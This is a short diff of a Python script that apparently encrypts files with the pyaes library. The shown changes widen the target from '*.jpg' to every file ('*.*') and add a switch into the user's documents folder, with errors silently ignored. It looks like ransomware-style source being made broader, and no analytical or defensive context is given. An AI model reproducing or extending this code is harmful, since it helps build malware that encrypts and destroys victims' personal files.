@@ -4,7 +4,7 @@ import time
 import pyaes
 from pathlib import Path
 
-lst_arq = ["*.jpg"]
+lst_arq = ["*.*"]
 
 print("Encrypting")
 time.sleep(3)
@@ -14,6 +14,8 @@ try:
 
 except Exception:
     pass
+
+os.chdir(documents)
 
 def Encrypting():
     for files in lst_arq:
